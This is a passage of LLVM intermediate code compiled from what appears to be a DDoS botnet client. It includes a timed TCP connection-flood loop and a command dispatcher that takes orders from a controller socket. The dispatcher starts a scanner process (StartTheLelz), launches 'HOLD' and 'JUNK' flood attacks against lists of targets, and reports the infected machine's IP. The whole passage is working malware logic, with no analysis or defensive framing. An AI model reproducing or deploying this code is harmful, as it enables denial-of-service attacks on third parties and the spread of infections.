  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 3
  %37 = getelementptr inbounds [8 x i8], [8 x i8]* %36, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 4 %37, i8 0, i64 8, i1 false)
  %38 = load i32, i32* %7, align 4
  %39 = zext i32 %38 to i64
  %40 = call i8* @llvm.stacksave()
  store i8* %40, i8** %10, align 8
  %41 = alloca %struct.state_t.4, i64 %39, align 16
  store i64 %39, i64* %11, align 8
  %42 = bitcast %struct.state_t.4* %41 to i8*
  %43 = load i32, i32* %7, align 4
  %44 = sext i32 %43 to i64
  %45 = mul i64 %44, 5
  call void @llvm.memset.p0i8.i64(i8* align 16 %42, i8 0, i64 %45, i1 false)
  %46 = call noalias align 16 i8* @malloc(i64 1024) #12
  store i8* %46, i8** %17, align 8
  %47 = load i8*, i8** %17, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %47, i8 0, i64 1024, i1 false)
  %48 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %49 = load i32, i32* %6, align 4
  %50 = add nsw i32 %48, %49
  store i32 %50, i32* %18, align 4
  br label %51

51:                                               ; preds = %266, %35
  %52 = load i32, i32* %18, align 4
  %53 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %54 = icmp sgt i32 %52, %53
  br i1 %54, label %55, label %267

55:                                               ; preds = %51
  store i32 0, i32* %8, align 4
  br label %56

56:                                               ; preds = %263, %55
  %57 = load i32, i32* %8, align 4
  %58 = load i32, i32* %7, align 4
  %59 = icmp slt i32 %57, %58
  br i1 %59, label %60, label %266

60:                                               ; preds = %56
  %61 = load i32, i32* %8, align 4
  %62 = sext i32 %61 to i64
  %63 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %41, i64 %62
  %64 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %63, i32 0, i32 1
  %65 = load i8, i8* %64, align 4
  %66 = zext i8 %65 to i32
  switch i32 %66, label %262 [
    i32 0, label %67
    i32 1, label %111
    i32 2, label %202
  ]

67:                                               ; preds = %60
  %68 = call i32 @socket(i32 2, i32 1, i32 0) #12
  %69 = load i32, i32* %8, align 4
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %41, i64 %70
  %72 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %71, i32 0, i32 0
  store i32 %68, i32* %72, align 8
  %73 = load i32, i32* %8, align 4
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %41, i64 %74
  %76 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %75, i32 0, i32 0
  %77 = load i32, i32* %76, align 8
  %78 = load i32, i32* %8, align 4
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %41, i64 %79
  %81 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %80, i32 0, i32 0
  %82 = load i32, i32* %81, align 8
  %83 = call i32 (i32, i32, ...) @fcntl(i32 %82, i32 3, i8* null)
  %84 = or i32 %83, 2048
  %85 = call i32 (i32, i32, ...) @fcntl(i32 %77, i32 4, i32 %84)
  %86 = load i32, i32* %8, align 4
  %87 = sext i32 %86 to i64
  %88 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %41, i64 %87
  %89 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %88, i32 0, i32 0
  %90 = load i32, i32* %89, align 8
  %91 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %92 = call i32 @connect(i32 %90, %struct.sockaddr* %91, i32 16)
  %93 = icmp ne i32 %92, -1
  br i1 %93, label %98, label %94

94:                                               ; preds = %67
  %95 = call i32* @__errno_location() #15
  %96 = load i32, i32* %95, align 4
  %97 = icmp ne i32 %96, 115
  br i1 %97, label %98, label %105

98:                                               ; preds = %94, %67
  %99 = load i32, i32* %8, align 4
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %41, i64 %100
  %102 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %101, i32 0, i32 0
  %103 = load i32, i32* %102, align 8
  %104 = call i32 @close(i32 %103)
  br label %110

105:                                              ; preds = %94
  %106 = load i32, i32* %8, align 4
  %107 = sext i32 %106 to i64
  %108 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %41, i64 %107
  %109 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %108, i32 0, i32 1
  store i8 1, i8* %109, align 4
  br label %110

110:                                              ; preds = %105, %98
  br label %262

111:                                              ; preds = %60
  br label %112

112:                                              ; preds = %111
  store %struct.fd_set* %12, %struct.fd_set** %20, align 8
  store i32 0, i32* %19, align 4
  br label %113

113:                                              ; preds = %123, %112
  %114 = load i32, i32* %19, align 4
  %115 = zext i32 %114 to i64
  %116 = icmp ult i64 %115, 16
  br i1 %116, label %117, label %126

117:                                              ; preds = %113
  %118 = load %struct.fd_set*, %struct.fd_set** %20, align 8
  %119 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %118, i32 0, i32 0
  %120 = load i32, i32* %19, align 4
  %121 = zext i32 %120 to i64
  %122 = getelementptr inbounds [16 x i64], [16 x i64]* %119, i64 0, i64 %121
  store i64 0, i64* %122, align 8
  br label %123

123:                                              ; preds = %117
  %124 = load i32, i32* %19, align 4
  %125 = add i32 %124, 1
  store i32 %125, i32* %19, align 4
  br label %113, !llvm.loop !49

126:                                              ; preds = %113
  br label %127

127:                                              ; preds = %126
  br label %128

128:                                              ; preds = %127
  %129 = load i32, i32* %8, align 4
  %130 = sext i32 %129 to i64
  %131 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %41, i64 %130
  %132 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %131, i32 0, i32 0
  %133 = load i32, i32* %132, align 8
  %134 = srem i32 %133, 64
  %135 = zext i32 %134 to i64
  %136 = shl i64 1, %135
  %137 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %138 = load i32, i32* %8, align 4
  %139 = sext i32 %138 to i64
  %140 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %41, i64 %139
  %141 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %140, i32 0, i32 0
  %142 = load i32, i32* %141, align 8
  %143 = sdiv i32 %142, 64
  %144 = sext i32 %143 to i64
  %145 = getelementptr inbounds [16 x i64], [16 x i64]* %137, i64 0, i64 %144
  %146 = load i64, i64* %145, align 8
  %147 = or i64 %146, %136
  store i64 %147, i64* %145, align 8
  %148 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 0
  store i64 0, i64* %148, align 8
  %149 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 1
  store i64 10000, i64* %149, align 8
  %150 = load i32, i32* %8, align 4
  %151 = sext i32 %150 to i64
  %152 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %41, i64 %151
  %153 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %152, i32 0, i32 0
  %154 = load i32, i32* %153, align 8
  %155 = add nsw i32 %154, 1
  %156 = call i32 @select(i32 %155, %struct.fd_set* null, %struct.fd_set* %12, %struct.fd_set* null, %struct.timeval* %13)
  store i32 %156, i32* %16, align 4
  %157 = load i32, i32* %16, align 4
  %158 = icmp eq i32 %157, 1
  br i1 %158, label %159, label %186

159:                                              ; preds = %128
  store i32 4, i32* %14, align 4
  %160 = load i32, i32* %8, align 4
  %161 = sext i32 %160 to i64
  %162 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %41, i64 %161
  %163 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %162, i32 0, i32 0
  %164 = load i32, i32* %163, align 8
  %165 = bitcast i32* %15 to i8*
  %166 = call i32 @getsockopt(i32 %164, i32 1, i32 4, i8* %165, i32* %14) #12
  %167 = load i32, i32* %15, align 4
  %168 = icmp ne i32 %167, 0
  br i1 %168, label %169, label %180

169:                                              ; preds = %159
  %170 = load i32, i32* %8, align 4
  %171 = sext i32 %170 to i64
  %172 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %41, i64 %171
  %173 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %172, i32 0, i32 0
  %174 = load i32, i32* %173, align 8
  %175 = call i32 @close(i32 %174)
  %176 = load i32, i32* %8, align 4
  %177 = sext i32 %176 to i64
  %178 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %41, i64 %177
  %179 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %178, i32 0, i32 1
  store i8 0, i8* %179, align 4
  br label %185

180:                                              ; preds = %159
  %181 = load i32, i32* %8, align 4
  %182 = sext i32 %181 to i64
  %183 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %41, i64 %182
  %184 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %183, i32 0, i32 1
  store i8 2, i8* %184, align 4
  br label %185

185:                                              ; preds = %180, %169
  br label %201

186:                                              ; preds = %128
  %187 = load i32, i32* %16, align 4
  %188 = icmp eq i32 %187, -1
  br i1 %188, label %189, label %200

189:                                              ; preds = %186
  %190 = load i32, i32* %8, align 4
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %41, i64 %191
  %193 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %192, i32 0, i32 0
  %194 = load i32, i32* %193, align 8
  %195 = call i32 @close(i32 %194)
  %196 = load i32, i32* %8, align 4
  %197 = sext i32 %196 to i64
  %198 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %41, i64 %197
  %199 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %198, i32 0, i32 1
  store i8 0, i8* %199, align 4
  br label %200

200:                                              ; preds = %189, %186
  br label %201

201:                                              ; preds = %200, %185
  br label %262

202:                                              ; preds = %60
  br label %203

203:                                              ; preds = %202
  store %struct.fd_set* %12, %struct.fd_set** %22, align 8
  store i32 0, i32* %21, align 4
  br label %204

204:                                              ; preds = %214, %203
  %205 = load i32, i32* %21, align 4
  %206 = zext i32 %205 to i64
  %207 = icmp ult i64 %206, 16
  br i1 %207, label %208, label %217

208:                                              ; preds = %204
  %209 = load %struct.fd_set*, %struct.fd_set** %22, align 8
  %210 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %209, i32 0, i32 0
  %211 = load i32, i32* %21, align 4
  %212 = zext i32 %211 to i64
  %213 = getelementptr inbounds [16 x i64], [16 x i64]* %210, i64 0, i64 %212
  store i64 0, i64* %213, align 8
  br label %214

214:                                              ; preds = %208
  %215 = load i32, i32* %21, align 4
  %216 = add i32 %215, 1
  store i32 %216, i32* %21, align 4
  br label %204, !llvm.loop !50

217:                                              ; preds = %204
  br label %218

218:                                              ; preds = %217
  br label %219

219:                                              ; preds = %218
  %220 = load i32, i32* %8, align 4
  %221 = sext i32 %220 to i64
  %222 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %41, i64 %221
  %223 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %222, i32 0, i32 0
  %224 = load i32, i32* %223, align 8
  %225 = srem i32 %224, 64
  %226 = zext i32 %225 to i64
  %227 = shl i64 1, %226
  %228 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %229 = load i32, i32* %8, align 4
  %230 = sext i32 %229 to i64
  %231 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %41, i64 %230
  %232 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %231, i32 0, i32 0
  %233 = load i32, i32* %232, align 8
  %234 = sdiv i32 %233, 64
  %235 = sext i32 %234 to i64
  %236 = getelementptr inbounds [16 x i64], [16 x i64]* %228, i64 0, i64 %235
  %237 = load i64, i64* %236, align 8
  %238 = or i64 %237, %227
  store i64 %238, i64* %236, align 8
  %239 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 0
  store i64 0, i64* %239, align 8
  %240 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 1
  store i64 10000, i64* %240, align 8
  %241 = load i32, i32* %8, align 4
  %242 = sext i32 %241 to i64
  %243 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %41, i64 %242
  %244 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %243, i32 0, i32 0
  %245 = load i32, i32* %244, align 8
  %246 = add nsw i32 %245, 1
  %247 = call i32 @select(i32 %246, %struct.fd_set* null, %struct.fd_set* null, %struct.fd_set* %12, %struct.timeval* %13)
  store i32 %247, i32* %16, align 4
  %248 = load i32, i32* %16, align 4
  %249 = icmp ne i32 %248, 0
  br i1 %249, label %250, label %261

250:                                              ; preds = %219
  %251 = load i32, i32* %8, align 4
  %252 = sext i32 %251 to i64
  %253 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %41, i64 %252
  %254 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %253, i32 0, i32 0
  %255 = load i32, i32* %254, align 8
  %256 = call i32 @close(i32 %255)
  %257 = load i32, i32* %8, align 4
  %258 = sext i32 %257 to i64
  %259 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %41, i64 %258
  %260 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %259, i32 0, i32 1
  store i8 0, i8* %260, align 4
  br label %261

261:                                              ; preds = %250, %219
  br label %262

262:                                              ; preds = %60, %261, %201, %110
  br label %263

263:                                              ; preds = %262
  %264 = load i32, i32* %8, align 4
  %265 = add nsw i32 %264, 1
  store i32 %265, i32* %8, align 4
  br label %56, !llvm.loop !51

266:                                              ; preds = %56
  br label %51, !llvm.loop !52

267:                                              ; preds = %51
  %268 = load i8*, i8** %10, align 8
  call void @llvm.stackrestore(i8* %268)
  br label %269

269:                                              ; preds = %267, %34
  ret void
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @processCmd(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8*, align 8
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca i8*, align 8
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca i8*, align 8
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i8*, align 8
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i8*, align 8
  %32 = alloca i32, align 4
  %33 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %34 = load i8**, i8*** %4, align 8
  %35 = getelementptr inbounds i8*, i8** %34, i64 0
  %36 = load i8*, i8** %35, align 8
  %37 = call i32 @strcmp(i8* %36, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.21, i64 0, i64 0)) #11
  %38 = icmp ne i32 %37, 0
  br i1 %38, label %42, label %39

39:                                               ; preds = %2
  %40 = load i32, i32* @mainCommSock, align 4
  %41 = call i32 (i32, i8*, ...) @sockprintf(i32 %40, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.50, i64 0, i64 0))
  br label %640

42:                                               ; preds = %2
  %43 = load i8**, i8*** %4, align 8
  %44 = getelementptr inbounds i8*, i8** %43, i64 0
  %45 = load i8*, i8** %44, align 8
  %46 = call i32 @strcmp(i8* %45, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.51, i64 0, i64 0)) #11
  %47 = icmp ne i32 %46, 0
  br i1 %47, label %53, label %48

48:                                               ; preds = %42
  %49 = load i32, i32* @mainCommSock, align 4
  %50 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %51 = call i8* @inet_ntoa(i32 %50) #12
  %52 = call i32 (i32, i8*, ...) @sockprintf(i32 %49, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.52, i64 0, i64 0), i8* %51)
  br label %640

53:                                               ; preds = %42
  %54 = load i8**, i8*** %4, align 8
  %55 = getelementptr inbounds i8*, i8** %54, i64 0
  %56 = load i8*, i8** %55, align 8
  %57 = call i32 @strcmp(i8* %56, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.53, i64 0, i64 0)) #11
  %58 = icmp ne i32 %57, 0
  br i1 %58, label %101, label %59

59:                                               ; preds = %53
  %60 = load i32, i32* %3, align 4
  %61 = icmp ne i32 %60, 2
  br i1 %61, label %62, label %65

62:                                               ; preds = %59
  %63 = load i32, i32* @mainCommSock, align 4
  %64 = call i32 (i32, i8*, ...) @sockprintf(i32 %63, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.54, i64 0, i64 0))
  br label %640

65:                                               ; preds = %59
  %66 = load i8**, i8*** %4, align 8
  %67 = getelementptr inbounds i8*, i8** %66, i64 1
  %68 = load i8*, i8** %67, align 8
  %69 = call i32 @strcmp(i8* %68, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.55, i64 0, i64 0)) #11
  %70 = icmp ne i32 %69, 0
  br i1 %70, label %78, label %71

71:                                               ; preds = %65
  %72 = load i32, i32* @scanPid, align 4
  %73 = icmp eq i32 %72, 0
  br i1 %73, label %74, label %75

74:                                               ; preds = %71
  br label %640

75:                                               ; preds = %71
  %76 = load i32, i32* @scanPid, align 4
  %77 = call i32 @kill(i32 %76, i32 9) #12
  store i32 0, i32* @scanPid, align 4
  br label %78

78:                                               ; preds = %75, %65
  %79 = load i8**, i8*** %4, align 8
  %80 = getelementptr inbounds i8*, i8** %79, i64 1
  %81 = load i8*, i8** %80, align 8
  %82 = call i32 @strcmp(i8* %81, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.56, i64 0, i64 0)) #11
  %83 = icmp ne i32 %82, 0
  br i1 %83, label %100, label %84

84:                                               ; preds = %78
  %85 = load i32, i32* @scanPid, align 4
  %86 = icmp ne i32 %85, 0
  br i1 %86, label %87, label %88

87:                                               ; preds = %84
  br label %640

88:                                               ; preds = %84
  %89 = call i32 @fork() #12
  store i32 %89, i32* %5, align 4
  %90 = load i32, i32* %5, align 4
  %91 = icmp ugt i32 %90, 0
  br i1 %91, label %92, label %94

92:                                               ; preds = %88
  %93 = load i32, i32* %5, align 4
  store i32 %93, i32* @scanPid, align 4
  br label %640

94:                                               ; preds = %88
  %95 = load i32, i32* %5, align 4
  %96 = icmp eq i32 %95, -1
  br i1 %96, label %97, label %98

97:                                               ; preds = %94
  br label %640

98:                                               ; preds = %94
  br label %99

99:                                               ; preds = %98
  call void @StartTheLelz()
  call void @_exit(i32 0) #14
  unreachable

100:                                              ; preds = %78
  br label %101

101:                                              ; preds = %100, %53
  %102 = load i8**, i8*** %4, align 8
  %103 = getelementptr inbounds i8*, i8** %102, i64 0
  %104 = load i8*, i8** %103, align 8
  %105 = call i32 @strcmp(i8* %104, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.57, i64 0, i64 0)) #11
  %106 = icmp ne i32 %105, 0
  br i1 %106, label %177, label %107

107:                                              ; preds = %101
  %108 = load i32, i32* %3, align 4
  %109 = icmp slt i32 %108, 4
  br i1 %109, label %122, label %110

110:                                              ; preds = %107
  %111 = load i8**, i8*** %4, align 8
  %112 = getelementptr inbounds i8*, i8** %111, i64 2
  %113 = load i8*, i8** %112, align 8
  %114 = call i32 @atoi(i8* %113) #11
  %115 = icmp slt i32 %114, 1
  br i1 %115, label %122, label %116

116:                                              ; preds = %110
  %117 = load i8**, i8*** %4, align 8
  %118 = getelementptr inbounds i8*, i8** %117, i64 3
  %119 = load i8*, i8** %118, align 8
  %120 = call i32 @atoi(i8* %119) #11
  %121 = icmp slt i32 %120, 1
  br i1 %121, label %122, label %123

122:                                              ; preds = %116, %110, %107
  br label %640

123:                                              ; preds = %116
  %124 = load i8**, i8*** %4, align 8
  %125 = getelementptr inbounds i8*, i8** %124, i64 1
  %126 = load i8*, i8** %125, align 8
  store i8* %126, i8** %6, align 8
  %127 = load i8**, i8*** %4, align 8
  %128 = getelementptr inbounds i8*, i8** %127, i64 2
  %129 = load i8*, i8** %128, align 8
  %130 = call i32 @atoi(i8* %129) #11
  store i32 %130, i32* %7, align 4
  %131 = load i8**, i8*** %4, align 8
  %132 = getelementptr inbounds i8*, i8** %131, i64 3
  %133 = load i8*, i8** %132, align 8
  %134 = call i32 @atoi(i8* %133) #11
  store i32 %134, i32* %8, align 4
  %135 = load i8*, i8** %6, align 8
  %136 = call i8* @strstr(i8* %135, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i64 0, i64 0)) #11
  %137 = icmp ne i8* %136, null
  br i1 %137, label %138, label %161

138:                                              ; preds = %123
  %139 = load i32, i32* @mainCommSock, align 4
  %140 = load i8*, i8** %6, align 8
  %141 = load i32, i32* %7, align 4
  %142 = load i32, i32* %8, align 4
  %143 = call i32 (i32, i8*, ...) @sockprintf(i32 %139, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.58, i64 0, i64 0), i8* %140, i32 %141, i32 %142)
  %144 = load i8*, i8** %6, align 8
  %145 = call i8* @strtok(i8* %144, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i64 0, i64 0)) #12
  store i8* %145, i8** %9, align 8
  br label %146

146:                                              ; preds = %158, %138
  %147 = load i8*, i8** %9, align 8
  %148 = icmp ne i8* %147, null
  br i1 %148, label %149, label %160

149:                                              ; preds = %146
  %150 = call i32 @listFork()
  %151 = icmp ne i32 %150, 0
  br i1 %151, label %158, label %152

152:                                              ; preds = %149
  %153 = load i8*, i8** %9, align 8
  %154 = load i32, i32* %7, align 4
  %155 = load i32, i32* %8, align 4
  call void @sendHOLD(i8* %153, i32 %154, i32 %155)
  %156 = load i32, i32* @mainCommSock, align 4
  %157 = call i32 @close(i32 %156)
  call void @_exit(i32 0) #14
  unreachable

158:                                              ; preds = %149
  %159 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i64 0, i64 0)) #12
  store i8* %159, i8** %9, align 8
  br label %146, !llvm.loop !53

160:                                              ; preds = %146
  br label %176

161:                                              ; preds = %123
  %162 = call i32 @listFork()
  %163 = icmp ne i32 %162, 0
  br i1 %163, label %164, label %165

164:                                              ; preds = %161
  br label %640

165:                                              ; preds = %161
  %166 = load i32, i32* @mainCommSock, align 4
  %167 = load i8*, i8** %6, align 8
  %168 = load i32, i32* %7, align 4
  %169 = load i32, i32* %8, align 4
  %170 = call i32 (i32, i8*, ...) @sockprintf(i32 %166, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.58, i64 0, i64 0), i8* %167, i32 %168, i32 %169)
  %171 = load i8*, i8** %6, align 8
  %172 = load i32, i32* %7, align 4
  %173 = load i32, i32* %8, align 4
  call void @sendHOLD(i8* %171, i32 %172, i32 %173)
  %174 = load i32, i32* @mainCommSock, align 4
  %175 = call i32 @close(i32 %174)
  call void @_exit(i32 0) #14
  unreachable

176:                                              ; preds = %160
  br label %177

177:                                              ; preds = %176, %101
  %178 = load i8**, i8*** %4, align 8
  %179 = getelementptr inbounds i8*, i8** %178, i64 0
  %180 = load i8*, i8** %179, align 8
  %181 = call i32 @strcmp(i8* %180, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.59, i64 0, i64 0)) #11
  %182 = icmp ne i32 %181, 0
  br i1 %182, label %253, label %183

183:                                              ; preds = %177
  %184 = load i32, i32* %3, align 4
  %185 = icmp slt i32 %184, 4
  br i1 %185, label %198, label %186

186:                                              ; preds = %183
  %187 = load i8**, i8*** %4, align 8
  %188 = getelementptr inbounds i8*, i8** %187, i64 2
  %189 = load i8*, i8** %188, align 8
  %190 = call i32 @atoi(i8* %189) #11
  %191 = icmp slt i32 %190, 1
  br i1 %191, label %198, label %192

192:                                              ; preds = %186
  %193 = load i8**, i8*** %4, align 8
  %194 = getelementptr inbounds i8*, i8** %193, i64 3
  %195 = load i8*, i8** %194, align 8
  %196 = call i32 @atoi(i8* %195) #11
  %197 = icmp slt i32 %196, 1
  br i1 %197, label %198, label %199

198:                                              ; preds = %192, %186, %183
  br label %640

199:                                              ; preds = %192
  %200 = load i8**, i8*** %4, align 8
  %201 = getelementptr inbounds i8*, i8** %200, i64 1
  %202 = load i8*, i8** %201, align 8
  store i8* %202, i8** %10, align 8
  %203 = load i8**, i8*** %4, align 8
  %204 = getelementptr inbounds i8*, i8** %203, i64 2
  %205 = load i8*, i8** %204, align 8
  %206 = call i32 @atoi(i8* %205) #11
  store i32 %206, i32* %11, align 4
  %207 = load i8**, i8*** %4, align 8
  %208 = getelementptr inbounds i8*, i8** %207, i64 3
  %209 = load i8*, i8** %208, align 8
  %210 = call i32 @atoi(i8* %209) #11
  store i32 %210, i32* %12, align 4
  %211 = load i8*, i8** %10, align 8
  %212 = call i8* @strstr(i8* %211, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i64 0, i64 0)) #11
  %213 = icmp ne i8* %212, null
  br i1 %213, label %214, label %237

214:                                              ; preds = %199
  %215 = load i32, i32* @mainCommSock, align 4
  %216 = load i8*, i8** %10, align 8
  %217 = load i32, i32* %11, align 4
  %218 = load i32, i32* %12, align 4
  %219 = call i32 (i32, i8*, ...) @sockprintf(i32 %215, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.60, i64 0, i64 0), i8* %216, i32 %217, i32 %218)
  %220 = load i8*, i8** %10, align 8
  %221 = call i8* @strtok(i8* %220, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i64 0, i64 0)) #12
  store i8* %221, i8** %13, align 8
  br label %222

222:                                              ; preds = %234, %214
  %223 = load i8*, i8** %13, align 8
  %224 = icmp ne i8* %223, null
  br i1 %224, label %225, label %236

225:                                              ; preds = %222
  %226 = call i32 @listFork()
  %227 = icmp ne i32 %226, 0
  br i1 %227, label %234, label %228

228:                                              ; preds = %225
  %229 = load i8*, i8** %13, align 8
  %230 = load i32, i32* %11, align 4
  %231 = load i32, i32* %12, align 4
  call void @sendJUNK(i8* %229, i32 %230, i32 %231)
  %232 = load i32, i32* @mainCommSock, align 4
  %233 = call i32 @close(i32 %232)
  call void @_exit(i32 0) #14
  unreachable

234:                                              ; preds = %225
  %235 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i64 0, i64 0)) #12
  store i8* %235, i8** %13, align 8
  br label %222, !llvm.loop !54

236:                                              ; preds = %222
  br label %252

237:                                              ; preds = %199
  %238 = call i32 @listFork()
  %239 = icmp ne i32 %238, 0
  br i1 %239, label %240, label %241

240:                                              ; preds = %237
  br label %640

241:                                              ; preds = %237
  %242 = load i32, i32* @mainCommSock, align 4
  %243 = load i8*, i8** %10, align 8
  %244 = load i32, i32* %11, align 4
  %245 = load i32, i32* %12, align 4
  %246 = call i32 (i32, i8*, ...) @sockprintf(i32 %242, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.60, i64 0, i64 0), i8* %243, i32 %244, i32 %245)
  %247 = load i8*, i8** %10, align 8
  %248 = load i32, i32* %11, align 4
  %249 = load i32, i32* %12, align 4
  call void @sendJUNK(i8* %247, i32 %248, i32 %249)
  %250 = load i32, i32* @mainCommSock, align 4
  %251 = call i32 @close(i32 %250)
  call void @_exit(i32 0) #14
  unreachable

252:                                              ; preds = %236
  br label %253

253:                                              ; preds = %252, %177
  %254 = load i8**, i8*** %4, align 8
  %255 = getelementptr inbounds i8*, i8** %254, i64 0
  %256 = load i8*, i8** %255, align 8
  %257 = call i32 @strcmp(i8* %256, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.61, i64 0, i64 0)) #11
  %258 = icmp ne i32 %257, 0
  br i1 %258, label %385, label %259

259:                                              ; preds = %253
  %260 = load i32, i32* %3, align 4
  %261 = icmp slt i32 %260, 6
  br i1 %261, label %307, label %262

262:                                              ; preds = %259
  %263 = load i8**, i8*** %4, align 8
  %264 = getelementptr inbounds i8*, i8** %263, i64 3
  %265 = load i8*, i8** %264, align 8
  %266 = call i32 @atoi(i8* %265) #11
  %267 = icmp eq i32 %266, -1
  br i1 %267, label %307, label %268

268:                                              ; preds = %262
  %269 = load i8**, i8*** %4, align 8
  %270 = getelementptr inbounds i8*, i8** %269, i64 2
  %271 = load i8*, i8** %270, align 8
  %272 = call i32 @atoi(i8* %271) #11
  %273 = icmp eq i32 %272, -1
  br i1 %273, label %307, label %274

274:                                              ; preds = %268
  %275 = load i8**, i8*** %4, align 8
  %276 = getelementptr inbounds i8*, i8** %275, i64 4
  %277 = load i8*, i8** %276, align 8
  %278 = call i32 @atoi(i8* %277) #11
  %279 = icmp eq i32 %278, -1
  br i1 %279, label %307, label %280

280:                                              ; preds = %274
  %281 = load i8**, i8*** %4, align 8
  %282 = getelementptr inbounds i8*, i8** %281, i64 5
  %283 = load i8*, i8** %282, align 8
  %284 = call i32 @atoi(i8* %283) #11
  %285 = icmp eq i32 %284, -1
  br i1 %285, label %307, label %286

286:                                              ; preds = %280
  %287 = load i8**, i8*** %4, align 8
  %288 = getelementptr inbounds i8*, i8** %287, i64 5
  %289 = load i8*, i8** %288, align 8
  %290 = call i32 @atoi(i8* %289) #11
  %291 = icmp sgt i32 %290, 65500
